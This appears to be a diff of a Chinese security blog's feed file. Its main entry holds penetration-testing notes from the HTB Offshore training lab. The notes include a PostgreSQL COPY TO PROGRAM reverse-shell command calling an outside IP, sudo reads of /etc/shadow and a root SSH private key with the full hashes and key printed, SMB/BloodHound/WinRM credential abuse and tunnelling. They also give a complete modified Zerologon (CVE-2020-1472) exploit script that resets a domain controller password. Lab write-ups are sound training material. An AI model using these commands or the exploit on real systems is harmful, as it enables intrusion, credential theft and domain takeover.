+mark@NIX01:/home/mark$ cat /etc/passwd | grep -E &quot;bash|sh$&quot;cat /etc/passwd | grep -E &quot;bash|sh$&quot;root:x:0:0:root:/root:/bin/bashsplunk:x:1002:1002:Splunk Server:/opt/splunk:/bin/bashpostgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+
+PostgreSQL 在本地：
+端口是5432
+
+
+测试发现**PostgreSQL 9.6.0 无密码直接进去了**
+/usr/local/pgsql/bin/psql -U postgres -p 5432 -h 127.0.0.1 -c &quot;select version();&quot;
+
+
+
+直接写shell RCE
+/usr/local/pgsql/bin/psql -U postgres -p 5432 -h 127.0.0.1 -c &quot;COPY (SELECT &#x27;&#x27;) TO PROGRAM &#x27;/bin/bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.84/4446 0&gt;&amp;1\&quot;&#x27;;&quot;
+
+
+
+另开端口监听：
+
+
+发现关键路径&#x2F;usr&#x2F;bin&#x2F;tail
+先拿个普通权限flag
+
+
+flag4：OFFSHORE{fun_w1th_m@g1k_bl0ck$}
+利用root 路径读root 权限flag
+
+
+flag5：OFFSHORE{st0p_tai1ing_m3_br0}
+利用root 路径的root权限 信息收集：
+postgres@NIX01:/usr/local/pgsql/data$ sudo /usr/bin/tail -n 100 /etc/shadowsudo /usr/bin/tail -n 100 /etc/shadowroot:$6$UM9dnBFE$5LRqppNoZhJmLz0.cLGlZXeDWYjy4u4MWbTW/8vMu.vSCbhTFlCLDsRvtxj8kF1RrlbCeyJHitm9g9.pLe4uM1:17652:0:99999:7:::daemon:*:17001:0:99999:7:::bin:*:17001:0:99999:7:::sys:*:17001:0:99999:7:::sync:*:17001:0:99999:7:::games:*:17001:0:99999:7:::man:*:17001:0:99999:7:::lp:*:17001:0:99999:7:::mail:*:17001:0:99999:7:::news:*:17001:0:99999:7:::uucp:*:17001:0:99999:7:::proxy:*:17001:0:99999:7:::www-data:*:17001:0:99999:7:::backup:*:17001:0:99999:7:::list:*:17001:0:99999:7:::irc:*:17001:0:99999:7:::gnats:*:17001:0:99999:7:::nobody:*:17001:0:99999:7:::systemd-timesync:*:17001:0:99999:7:::systemd-network:*:17001:0:99999:7:::systemd-resolve:*:17001:0:99999:7:::syslog:*:17001:0:99999:7:::_apt:*:17001:0:99999:7:::messagebus:*:17564:0:99999:7:::uuidd:*:17564:0:99999:7:::mark:$6$J7gvzz87$jy.tjUc9mWJHy5nxZtuqtXcX6zJdCAE8eX87rZfzEE0zaV8rKHyzNQ5YWzSn/ust0Y96sMRCWrFEkGhv5QD.O/:17642:0:99999:7:::sshd:*:17564:0:99999:7:::splunk:!:17564:0:99999:7:::postgres:$6$ZQdBsxBU$YZeJIBNXNEJIWv5cwwGnuHrfxL04zaj1GXE0NhgL8pvmSgU2Csb/HTdesfPb7NY4ru7/UXa7Dvy/BynKzJLlI/:17758:0:99999:7:::colord:*:19163:0:99999:7:::saned:*:19656:0:99999:7:::postgres@NIX01:/usr/local/pgsql/data$ 
+
+三个哈希：root&#x2F;mark&#x2F;postgres，但都拿到shell了
+就破解出来一个&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;mark&lt;/font&gt;: toor
+一开始fscan:这台机子还有22端口
+有&#x2F;.ssh&#x2F;id_rsa
+postgres@NIX01:/usr/local/pgsql/data$ sudo /usr/bin/tail -n 200 /root/.ssh/id_rsaaudo /usr/bin/tail -n 200 /root/.ssh/id_rsa-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEAoqnXGZVkxIu7Y9+Bln8k1irzetIT+WkRLHeHvj1Hv0FV/JOOcqAatFMmCe7NERWu+x2yrT/JT9kdb/Z0YS5WLEbWdxJihhgj1YTwRLjRw818UxyrHBGufOU4rHmitZAMVWiPIgZS/+7dxt4PEhxVdj2MJMTzzvo4MU1NBWfQt8p/i6kwHKH93iCrUHvUsDqHbJnK9Z03QL5ZaGN7hPntHUDLLpOvBO9e2sjUJAUuu2HUeNGfOtYEBEe3J21FSUTucoXiEzSEg5eyK/X6JywELbPB4wfB+vDNN1D8GIQdemX1HjrIWm3F/WnZ3wXzYQRAg44SsZHherfVKPM8J/jv6QIDAQABAoIBAFyAgy8sUtqmr9Dy6InCEhus3ztoPi2mfzqvWsVnqeZsbE6vRuGOhMEpS8d4QqvFjfWGBPcbAAtlZ6UlHTeqlxykyA98qASjs7UX3V7nT3qu31WQRwo2T+j8nYcPwOTJXwou5L6vpAGhQAN4gk+FR2BvTcQXMKLyjoQS9ortZ7csC9ZSJtZpU8inH0eIHmhG9aou2grGfKLbHDyTTd7x3FLCX15K2XQKaKMnOt1upWcn5KoXpRY3xrvSEaNOeON1f3gmdDi9CDxfVrJHLE68QixJsdrmXBQJBMoNXje9m6Y6r0AzqHLXPQtscEqNIsePYxt6mnUfthTYX8Fbv1VxU9UCgYEAzF6M4TL+nnTiKhb+LFEx8e3B3Rb4h9SZADq5ha44p8KtJFanV0oGeAO67BA1oCA976R0FeZpiiIvZlxAmhw2K8tSJ53QJL9xnfr2OMJytQr/9ov1mF4UMAqQSE2vMisfQEb6moWUQKEa8aZ+VYBnE2Lp9oAAQWsVINzVMKxdHBsCgYEAy8H9KcgtoVNzFJZQxPNIwR6QdngCn2GKu93+Z4vX/d00zA/XkpkYQHZvqKwSafmgu2AXj5hhJkUVz+iNZzU6pZKBoHxSNnJOynSeQMzHNKikNud9YW8pas+buYi2TSxTFL1LH6vKATQn3aSFWsM/eNFVdDGp8mcPkQ3vl5FIXEsCgYASbS/8mhF1DgraSqpuKn/7VTmWipyr+pI1ABZ8JCI9lgLwdNOvvh/pMETpRejf4ChVdBl3ZAf+CWkGrKiyfHqx5iopIkSDG7PNz7PlmDqpci1z+FiTfWAKmNk7e62hM1wk+oFb71FXpm78fMuFQAeLKu73Z8EeJN6J0P9z3QakIwKBgQCQZMGumVBU0hlsjnVgjPOS/8DqY3OgVPSG2/PMl1qSae9faR6goeOA0y2fv4kxFpjkEF3CAf9eqnihpLCIYj1UVnWMMG3mba0OZgQ78aJ928C7s+KzaJ5WNheqLIrcN7wMp3SUVh5KKhbSSCPExTa2vMotFIDV6lkqt1CB/Y/k7wKBgESEY+taPfoUO49mMsmiBn96XlTx9pCg6WlXPZeCTCymUXDovNn1HfxKCS5Lckpjr11RNP+xb8G1Q8xSiJNfMtrBsVh2es7QxVnrQsd4B+2UQC5llehHD/UkpnJob1HS8o17jQFgleQYYFvDDtGqj87ZgfcLBmc+JbP+oYiXbfKE-----END RSA PRIVATE KEY-----postgres@NIX01:/usr/local/pgsql/data$ 
+
+Kali 上保存私钥并测试 SSH
+cat &gt; /tmp/nix01_id_rsa &lt;&lt; &#x27;EOF&#x27;-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEAoqnXGZVkxIu7Y9+Bln8k1irzetIT+WkRLHeHvj1Hv0FV/JOOcqAatFMmCe7NERWu+x2yrT/JT9kdb/Z0YS5WLEbWdxJihhgj1YTwRLjRw818UxyrHBGufOU4rHmitZAMVWiPIgZS/+7dxt4PEhxVdj2MJMTzzvo4MU1NBWfQt8p/i6kwHKH93iCrUHvUsDqHbJnK9Z03QL5ZaGN7hPntHUDLLpOvBO9e2sjUJAUuu2HUeNGfOtYEBEe3J21FSUTucoXiEzSEg5eyK/X6JywELbPB4wfB+vDNN1D8GIQdemX1HjrIWm3F/WnZ3wXzYQRAg44SsZHherfVKPM8J/jv6QIDAQABAoIBAFyAgy8sUtqmr9Dy6InCEhus3ztoPi2mfzqvWsVnqeZsbE6vRuGOhMEpS8d4QqvFjfWGBPcbAAtlZ6UlHTeqlxykyA98qASjs7UX3V7nT3qu31WQRwo2T+j8nYcPwOTJXwou5L6vpAGhQAN4gk+FR2BvTcQXMKLyjoQS9ortZ7csC9ZSJtZpU8inH0eIHmhG9aou2grGfKLbHDyTTd7x3FLCX15K2XQKaKMnOt1upWcn5KoXpRY3xrvSEaNOeON1f3gmdDi9CDxfVrJHLE68QixJsdrmXBQJBMoNXje9m6Y6r0AzqHLXPQtscEqNIsePYxt6mnUfthTYX8Fbv1VxU9UCgYEAzF6M4TL+nnTiKhb+LFEx8e3B3Rb4h9SZADq5ha44p8KtJFanV0oGeAO67BA1oCA976R0FeZpiiIvZlxAmhw2K8tSJ53QJL9xnfr2OMJytQr/9ov1mF4UMAqQSE2vMisfQEb6moWUQKEa8aZ+VYBnE2Lp9oAAQWsVINzVMKxdHBsCgYEAy8H9KcgtoVNzFJZQxPNIwR6QdngCn2GKu93+Z4vX/d00zA/XkpkYQHZvqKwSafmgu2AXj5hhJkUVz+iNZzU6pZKBoHxSNnJOynSeQMzHNKikNud9YW8pas+buYi2TSxTFL1LH6vKATQn3aSFWsM/eNFVdDGp8mcPkQ3vl5FIXEsCgYASbS/8mhF1DgraSqpuKn/7VTmWipyr+pI1ABZ8JCI9lgLwdNOvvh/pMETpRejf4ChVdBl3ZAf+CWkGrKiyfHqx5iopIkSDG7PNz7PlmDqpci1z+FiTfWAKmNk7e62hM1wk+oFb71FXpm78fMuFQAeLKu73Z8EeJN6J0P9z3QakIwKBgQCQZMGumVBU0hlsjnVgjPOS/8DqY3OgVPSG2/PMl1qSae9faR6goeOA0y2fv4kxFpjkEF3CAf9eqnihpLCIYj1UVnWMMG3mba0OZgQ78aJ928C7s+KzaJ5WNheqLIrcN7wMp3SUVh5KKhbSSCPExTa2vMotFIDV6lkqt1CB/Y/k7wKBgESEY+taPfoUO49mMsmiBn96XlTx9pCg6WlXPZeCTCymUXDovNn1HfxKCS5Lckpjr11RNP+xb8G1Q8xSiJNfMtrBsVh2es7QxVnrQsd4B+2UQC5llehHD/UkpnJob1HS8o17jQFgleQYYFvDDtGqj87ZgfcLBmc+JbP+oYiXbfKE-----END RSA PRIVATE KEY-----EOFchmod 600 /tmp/nix01_id_rsa# 测试 SSH 登录（外部地址 10.10.110.123）ssh -i /tmp/nix01_id_rsa -o StrictHostKeyChecking=no root@10.10.110.123 whoami
+
+
+
+连接成功，权限是root,也能拿root的flag
+利用ssh搭一个sshuttle隧道，方便之后的横移sudo sshuttle -vr root@10.10.110.123 172.16.1.0/24 --ssh-cmd &#x27;ssh -i /tmp/nix01_id_rsa&#x27;
+
+sudo sshuttle -vr root@10.10.110.123 172.16.1.0/24 --dns \  --ssh-cmd &#x27;ssh -i /tmp/nix01_id_rsa&#x27;#Kali 无法解析 LAB.OFFSHORE.LOCAL（sshuttle 默认不转发 DNS）。#解决办法：sshuttle 加 --dns 参数，让 DNS 查询也走远程隧道（由 NIX01 用内网 DNS 解析）
+
+
+一句话：sshuttle 把 172.16.1.0&#x2F;24 内网”插”到了你的 Kali 上，让 Kali 觉得自己就在内网里。
+
+
+
+
+
+chisel (之前)
+sshuttle (现在)
+
+
+
+方向
+NIX01 → Kali（反向 socks）
+Kali → NIX01（SSH）
+
+
+访问内网
+每条命令都要 &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;proxychains4&lt;/font&gt;前缀
+直接 &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;nmap 172.16.1.30&lt;/font&gt;，零前缀
+
+
+工具兼容
+proxychains 下 nmap&#x2F;msf 常出错、慢
+原生工作，快
+
+
+通道
+SOCKS 明文转发
+SSH 加密
+
+
+稳定性
+依赖 NIX01 上那个进程
+依赖你 Kali 上这个终端
+
+
+连ssh的shell:
+
+
+没什么别的信息
+corp.local 横移：
+
+
+
+172.16.1.5
+DC01
+corp.local
+🔴 DC
+88, 135, 139, 389, 445
+Win 2016
+
+
+
+172.16.1.15
+SQL01
+corp.local
+SQL
+135, 139, 445, 1433
+MSSQL
+
+
+172.16.1.23
+NIX01（拿下）
+corp.local
+🟢 入口机
+22, 80, 8000, 8089
+Splunk + ACME Bank
+
+
+172.16.1.24
+WEB-WIN01
+corp.local
+Web
+80, 135, 139, 445
+&#x3D; 10.10.110.124
+
+
+172.16.1.30
+MS01
+corp.local
+🔴ManageEngine
+22, 80, 135, 139, 445
+OpManage（RCE）
+
+
+172.16.1.36
+WSADM
+corp.local
+工作站
+135, 139, 445
+—
+
+
+172.16.1.101
+WS02
+corp.local
+工作站
+135, 139, 445
+Win 7 SP1
+
+
+172.16.1.26
+FS01
+corp.local
+
+135，445
+
+
+
+smb枚举一下
+nxc smb 172.16.1.0/24 -u &#x27;&#x27; -p &#x27;&#x27; --shares 2&gt;&amp;1 | tee /tmp/shares_all.txt
+
+发现新机子
+172.16.1.26     FS01
+扫一下（更新fscan）135，445
+
+
+这里需要一组凭据才能横移，但是死活找不到，网上wp的还不对，看看别的域
+2️⃣域JOE-LPTP：
+
+
+172.16.1.201
+JOE-LPTP（拿下ftp）
+JOE-LAB
+🔴 FTP+Web
+21, 80, 135, 139, 445
+FTP匿名!    SmbGhost!
+
+
+
+JOE-LPTP：172.16.1.201-frpFTP 匿名登录 .201
+┌──(echoin㉿kali)-[/]└─$ proxychains ftp anonymous@172.16.1.201 [proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:21  ...  OKConnected to 172.16.1.201.220 Microsoft FTP Service331 Anonymous access allowed, send identity (e-mail name) as password.Password: 230 User logged in.Remote system type is Windows_NT.ftp&gt; ls229 Entering Extended Passive Mode (|||62718|)[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:62718  ...  OK125 Data connection already open; Transfer starting.10-18-20  01:57PM       &lt;DIR&gt;          .dbus-keyrings10-11-20  07:01PM       &lt;DIR&gt;          .vscode10-10-20  10:13PM       &lt;DIR&gt;          3D Objects10-10-20  10:13PM       &lt;DIR&gt;          Contacts08-01-22  10:05PM       &lt;DIR&gt;          Desktop10-18-20  01:57PM       &lt;DIR&gt;          Documents04-17-21  10:03AM       &lt;DIR&gt;          Downloads10-10-20  10:13PM       &lt;DIR&gt;          Favorites10-10-20  10:13PM       &lt;DIR&gt;          Links10-24-20  10:42AM       &lt;DIR&gt;          Music10-22-20  05:31AM       &lt;DIR&gt;          OneDrive10-11-20  06:52PM       &lt;DIR&gt;          Pictures10-10-20  10:13PM       &lt;DIR&gt;          Saved Games10-10-20  10:15PM       &lt;DIR&gt;          Searches10-16-20  05:31PM       &lt;DIR&gt;          Videos
+
+直接读flag没权限，get 前先切到可写的目录：
+ftp&gt; lcd &#x2F;tmp
+ftp&gt; get flag.txt
+ftp&gt; !cat &#x2F;tmp&#x2F;flag.txt
+ftp&gt; cat flag.txt?Invalid command.ftp&gt; get flag.txtlocal: flag.txt remote: flag.txtftp: Can&#x27;t access `flag.txt&#x27;: 权限不够ftp&gt; lcd /tmpLocal directory now: /tmpftp&gt; get flag.txtlocal: flag.txt remote: flag.txt229 Entering Extended Passive Mode (|||62720|)[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:62720  ...  OK125 Data connection already open; Transfer starting.100% |***************************************************************************************************************|    31        0.02 KiB/s    00:00 ETAftp: Reading from network: 被中断的系统调用  0% |                                                                                                               |    -1        0.00 KiB/s    --:-- ETA226 Transfer complete.ftp&gt; !cat /tmp/flag.txt[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17OFFSHORE&#123;st0p_us1ng_fr33warez!&#125;ftp&gt; 
+
+flag3：OFFSHORE{st0p_us1ng_fr33warez!}
+信息收集：
+
+
+
+
+下载下来
+ctb 可能是 CherryTree，直接 strings
+┌──(echoin㉿kali)-[~]└─$ strings /tmp/infra_testing.ctb 2&gt;/dev/null | head -50SQLite format 3tablebookmarkbookmark   CREATE TABLE bookmark (node_id INTEGER UNIQUE,sequence INTEGER)/indexsqlite_autoindex_bookmark_1bookmark/tablechildrenchildrenCREATE TABLE children (node_id INTEGER UNIQUE,father_id INTEGER,sequence INTEGER)/indexsqlite_autoindex_children_1childrentableimageimageCREATE TABLE image (node_id INTEGER,offset INTEGER,justification TEXT,anchor TEXT,png BLOB,filename TEXT,link TEXT,time INTEGER)itablegridgridCREATE TABLE grid (node_id INTEGER,offset INTEGER,justification TEXT,txt TEXT,col_min INTEGER,col_max INTEGER)tablecodeboxcodeboxCREATE TABLE codebox (node_id INTEGER,offset INTEGER,justification TEXT,txt TEXT,syntax TEXT,width INTEGER,height INTEGER,is_width_pix INTEGER,do_highl_bra INTEGER,do_show_linenum INTEGER)QtablenodenodeCREATE TABLE node (node_id INTEGER UNIQUE,name TEXT,txt TEXT,syntax TEXT,tags TEXT,is_ro INTEGER,is_richtxt INTEGER,has_codebox INTEGER,has_table INTEGER,has_image INTEGER,level INTEGER,ts_creation INTEGER,ts_lastsave INTEGER)&#x27;indexsqlite_autoindex_node_1nodeInternal testing&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;node&gt;&lt;rich_text&gt;-Widespread exploitation of CVE-2020-1472 in the wild-Server team unaware of the effects of immediately patching DCs in CORP, DEV, ADMIN, CLIENT - concerns with rushing an unknown patch-Todd sent this article around: &lt;/rich_text&gt;&lt;rich_text link=&quot;webs https://www.lares.com/blog/from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472/&quot;&gt;https://www.lares.com/blog/from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472/&lt;/rich_text&gt;&lt;rich_text&gt;        -Attack generates event code 5805, 4624, and 4742. Is responding to one of these events enough to prevent exploitation while we further test the patch?        -What effects will running this have to combat successful exploitation? &lt;/rich_text&gt;&lt;rich_text link=&quot;webs https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1&quot;&gt;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1&lt;/rich_text&gt;&lt;rich_text&gt; -Mitigation &lt;/rich_text&gt;&lt;rich_text style=&quot;italic&quot;&gt;seems&lt;/rich_text&gt;&lt;rich_text&gt; to work for now-Installed patch on SRV01-Higher ups decided to push an emergency patch to all 4 DCs...-Need to decommission domain before the auditors come in &lt;/rich_text&gt;&lt;/node&gt;custom-colors_
+
+泄露的信息：
+CVE-2020-1472	Zerologon！DC 可能未打补丁
+SRV01	已打补丁，但其他 DC “担心未知补丁风险”
+&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);&quot;&gt;infra_testing.ctb&lt;/font&gt; 是 Carbon FTP 的 SQLite 配置数据库，sqlite3 infra_testing.ctb 打开数据库  
+
+
+测试三个域 Zerologon
+proxychains netexec smb 172.16.1.5 -M zerologon 2&gt;&amp;1proxychains netexec smb 172.16.1.200 -M zerologon 2&gt;&amp;1  （成功）proxychains netexec smb 172.16.1.220 -M zerologon 2&gt;&amp;1
+
+
+
+DC0 是 VULNERABLE，第三个域
+🚩carbonftp 配置文件-&gt;加密凭据泄露JOE-LPTP桌面上有Carbon FTP.lnk
+这是个FTP 客户端!FTP客户端的配置文件(AppData\Roaming\WeowiselCarbonFTP)通常保存着FTP 服务器地址和凭据
+
+
+
+
+
+
+
+
+Server:  ftp.offshore.localUser:    joePassword: 19852327402859129171335082736410993
+
+flag6：OFFSHORE{An0N_FtP_c@n_rev3al_tr3asUre$}（我只能说这个flag太隐蔽了）
+password用豆包解出来是 Dev0ftheyear!  -**Neowise CarbonFTP v1.4**的密码加密漏洞（CVE-2020-6857）  
+得到一组凭据： joe:Dev0ftheyear!
+在域JOE-LAB的JOE-LPTP：172.16.1.201里
+得到一组凭据： joe:Dev0ftheyear!
+joe是域用户
+joe:Dev0ftheyear! 可能是 JOE-LPTP 的本地 Windows 登录密码
+nxc smb 172.16.1.201 -u joe -p &#x27;Dev0ftheyear!&#x27; --local-auth 2&gt;&amp;1 | tail -2
+
+
+
+对 JOE-LPTP 本地认证成功！ 但 joe 不是本地管理员（ADMIN$ 不可写）。但能 SMB 认证就能访问共享&#x2F;文件
+nxc smb 172.16.1.201 -u joe -p &#x27;Dev0ftheyear!&#x27; --shares 2&gt;&amp;1 | tail -12
+
+
+
+但joe 是普通用户（无法写 C$&#x2F;创建任务）
+但IPC$可读：
+IPC$ 可读有价值 —— 它是 RPC 通道，能枚举域信任关系、密码策略、域信息（这些是横向移动的关键）
+rpcclient -U &#x27;LAB.OFFSHORE.LOCAL/joe%Dev0ftheyear!&#x27; 172.16.1.200 -c \  &quot;querydominfo; enumdomtrust; getdompwinfo&quot; 2&gt;&amp;1 | head -25
+
+enumdomtrust 会列出 LAB 域信任的所有域
+
+
+重要发现：LAB 域有 41 个用户
+
+
+但LAB 域只有 5 个用户（无其他隐藏账户）。目标很明确：joe_adm &#x2F; Administrator。
+现在最关键的是 bloodhound 收集 LAB 域 —— 它可能显示 joe 对某个账户有 ACL 权限（GenericAll&#x2F;GenericWrite），那就是提权路径！
+检测 WinRM 是否可直接登录  
+proxychains -q crackmapexec winrm 172.16.1.201 -u joe -p &#x27;Dev0ftheyear!&#x27; -d LAB.OFFSHORE.LOCAL
+
+
+
+proxychains -q evil-winrm -i 172.16.1.201 -u &#x27;LAB.OFFSHORE.LOCAL\joe&#x27; -p &#x27;Dev0ftheyear!&#x27;
+
+
+
+bloodhound 收集 LAB 域bloodhound-python -d LAB.OFFSHORE.LOCAL -u joe -p &#x27;Dev0ftheyear!&#x27; \  -ns 172.16.1.200 --dns-tcp -c All --zip
+
+
+
+看攻击路径
+
+JOE_ADM@LAB.OFFSHORE.LOCAL 直接对域有 DCSync 权限  
+**DC0和SRV01也直接对域有 DCSync 权限  **
+
+
+
+
+
+JOE_ADM 是 WORKSTATION ADMINS 的成员
+WORKSTATION ADMINS 是 ADMINISTRATORS 的成员
+WORKSTATION ADMINS 对 DC0 有 AdminTo 权限（直接登录域控当管理员）
+WORKSTATION ADMINS 有 DCSync 权限
+
+但是joe 没有任何直接提权路径（无出站 ACL，不在特权组）。攻击路径明确指向 joe_adm → DCSync
+所以要想办法拿到 joe_adm 
+现在的思路就是要么拿到joe的shell，再提权，要么就是直接打 joe_adm ，但是现在没有joe_adm的密码或凭据
+3️⃣域LAB.OFFSHORE.LOCAL
+
+
+172.16.1.200
+DC0
+LAB.OFFSHORE.LOCAL
+🔴 DC
+88, 135, 139, 389, 445
+
+
+
+172.16.1.220
+SRV01
+LAB.OFFSHORE.LOCAL
+🔴 DC
+88, 135, 139, 389, 445
+
+
+# ① 确认 joe 在 LAB 域的 SMB + 枚举共享nxc smb 172.16.1.200 -u joe -p &#x27;Dev0ftheyear!&#x27; -d LAB.OFFSHORE.LOCAL --shares 2&gt;&amp;1 | tail -5# ② 对 LAB 域 DC0 和 SRV01 都测nxc smb 172.16.1.200 172.16.1.220 -u joe -p &#x27;Dev0ftheyear!&#x27; -d LAB.OFFSHORE.LOCAL --shares 2&gt;&amp;1 | grep -iE &quot;\[.\]|shares|backup&quot; | head -20
+
+
+
+joe:Dev0ftheyear!    在 LAB.OFFSHORE.LOCAL 认证成功，能读 SYSVOL&#x2F;NETLOGON
+DC0:172.16.1.200Zerologon  DC0 是 VULNERABLE
+cve-2020-1472
+# Step 1: 重置 DC0$ 密码为空python3 /home/echoin/lab/CVE-2020-1472/cve-2020-1472-exploit.py DC0 172.16.1.200
+
+
+
+dc0密码置空了，但是没dump成功hash
+分析cve-2020-1472-exploit.py：第 63 行是：request[‘ClearNewPassword’] &#x3D; b’\x00’ * 516    # 设空密码，把它改成 UTF-16LE 编码的已知密码就行。创建一个改良版 exploit：
+cat &gt; /tmp/zero_setpass2.py &lt;&lt; &#x27;PYEOF&#x27;#!/usr/bin/env python3from impacket.dcerpc.v5 import nrpc, epmfrom impacket.dcerpc.v5 import transportimport sys, structMAX_ATTEMPTS = 2000def try_zero_auth(rpc_con, dc_handle, target):    plaintext = b&#x27;\x00&#x27; * 8    ciphertext = b&#x27;\x00&#x27; * 8    flags = 0x212fffff    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle+&#x27;\x00&#x27;, target+&#x27;\x00&#x27;, plaintext)    try:        server_auth = nrpc.hNetrServerAuthenticate3(            rpc_con, dc_handle+&#x27;\x00&#x27;, target+&#x27;$\x00&#x27;,            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,            target+&#x27;\x00&#x27;, ciphertext, flags)        assert server_auth[&#x27;ErrorCode&#x27;] == 0        return True    except nrpc.DCERPCSessionError as ex:        if ex.get_error_code() == 0xc0000022: return None        else: print(f&#x27;Err: &#123;ex.get_error_code()&#125;&#x27;); return Falsedef set_pass(dc_handle, rpc_con, target, password):    request = nrpc.NetrServerPasswordSet2()    request[&#x27;PrimaryName&#x27;] = dc_handle + &#x27;\x00&#x27;    request[&#x27;AccountName&#x27;] = target + &#x27;$\x00&#x27;    request[&#x27;SecureChannelType&#x27;] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel    a = nrpc.NETLOGON_AUTHENTICATOR()    a[&#x27;Credential&#x27;] = b&#x27;\x00&#x27; * 8; a[&#x27;Timestamp&#x27;] = 0    request[&#x27;Authenticator&#x27;] = a    request[&#x27;ComputerName&#x27;] = target + &#x27;\x00&#x27;    pw = password.encode(&#x27;utf-16-le&#x27;)    # 512 bytes password + 4 bytes length field    buf = pw + b&#x27;\x00&#x27; * (512 - len(pw)) + struct.pack(&#x27;&lt;I&#x27;, len(pw))    request[&#x27;ClearNewPassword&#x27;] = buf    return rpc_con.request(request)def main():    dc_name, dc_ip, new_pass = sys.argv[1], sys.argv[2], sys.argv[3]    dc_h = &#x27;\\\\&#x27; + dc_name; t = dc_name.rstrip(&#x27;$&#x27;)    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol=&#x27;ncacn_ip_tcp&#x27;)    rpc = transport.DCERPCTransportFactory(binding).get_dce_rpc()    rpc.connect(); rpc.bind(nrpc.MSRPC_UUID_NRPC)    print(&#x27;Auth...&#x27;)    for i in range(MAX_ATTEMPTS):        r = try_zero_auth(rpc, dc_h, t)        if r is None: print(&#x27;=&#x27;, end=&#x27;&#x27;, flush=True)        elif r: break        else: sys.exit(1)    print(f&#x27;\nSet pass: &#123;new_pass&#125;&#x27;)    for i in range(MAX_ATTEMPTS):        try: result = set_pass(dc_h, rpc, t, new_pass)        except nrpc.DCERPCSessionError as ex:            if ex.get_error_code() == 0xc0000022: print(&#x27;=&#x27;, end=&#x27;&#x27;, flush=True); continue            else: sys.exit(1)        if result is None: print(&#x27;=&#x27;, end=&#x27;&#x27;, flush=True)        else: break    if result[&#x27;ErrorCode&#x27;] == 0:        print(&#x27;\nSUCCESS!&#x27;)        print(f&#x27;Run: proxychains impacket-secretsdump &quot;LAB.OFFSHORE.LOCAL/DC0\$:&#123;new_pass&#125;&quot;@172.16.1.200&#x27;)        print(f&#x27;Or:  proxychains impacket-secretsdump LAB/DC0\$:&#123;new_pass&#125;@172.16.1.200&#x27;)    else: print(f&#x27;ErrCode: &#123;result[&quot;ErrorCode&quot;]&#125;&#x27;)if __name__ == &#x27;__main__&#x27;: main()PYEOFchmod +x /tmp/zero_setpass2.py
+
+改DC0密码为P@ssw0rd123!
+proxychains python3 /tmp/zero_setpass2.py DC0 172.16.1.200 &#x27;P@ssw0rd123!&#x27;
+
+但是就是改不成功
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>域渗透</tag>
+        <tag>HTB</tag>
+        <tag>Offshore</tag>
+        <tag>Active Directory</tag>
       </tags>
   </entry>
   <entry>
@@ -230,70 +1677,6 @@ python tgsrepcrack.py rockyou.txt ticket.kirbi
         <tag>Kerberos</tag>
         <tag>域渗透</tag>
         <tag>Kerberoasting</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF Writeup 写作模板</title>
-    <url>/2026/08/14/ctf-writeup-template/</url>
-    <content><![CDATA[
-这是一篇示例文章，展示 Writeup 的推荐写法。写完自己的 Writeup 后可以删除本文。
-
-一、题目信息
-
-
-项目
-内容
-
-
-
-赛事
-某某 CTF 2026
-
-
-题目
-题目名称
-
-
-类型
-Web &#x2F; Pwn &#x2F; Crypto &#x2F; Misc &#x2F; Reverse
-
-
-分值
-500
-
-
-难度
-⭐⭐⭐
-
-
-二、题目描述把题目描述和附件下载链接贴在这里。
-三、解题过程3.1 信息收集打开题目，观察页面，抓包分析：
-curl -s http://target.com/ | head -20
-
-3.2 漏洞分析发现漏洞点，说明原理：
-import requestsr = requests.get(&#x27;http://target.com/flag.php&#x27;)print(r.text)
-
-3.3 漏洞利用给出完整的利用脚本（POC &#x2F; EXP）：
-python3 exp.py
-
-
-注意：关键 payload 记得用代码块包裹，方便读者复制。
-
-四、获取 Flagflag&#123;this_is_an_example_flag&#125;
-
-五、总结
-考察的知识点
-踩过的坑
-相关参考链接
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Writeup</tag>
-        <tag>模板</tag>
       </tags>
   </entry>
   <entry>
@@ -448,55 +1831,124 @@ RBCD + Bronze Bit
       </tags>
   </entry>
   <entry>
-    <title>靶场笔记写作模板</title>
-    <url>/2026/08/14/lab-notes-template/</url>
-    <content><![CDATA[
-这是一篇示例文章，展示靶场笔记的推荐写法。
+    <title>HTTP 请求走私</title>
+    <url>/2026/08/14/http-request-smuggling/</url>
+    <content><![CDATA[HTTP请求走私是一种攻击技术，利用前端和后端服务器对HTTP请求的解析差异，将恶意请求夹带在合法请求中，从而绕过安全控制，访问敏感数据或攻击其他用户。
+漏洞原理：HTTP请求走私漏洞的产生主要是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：Content-Length头和Transfer-Encoding头。前端和后端服务器可能对这两种头的处理方式不同，从而导致请求边界的不同步。
+Content-Length头
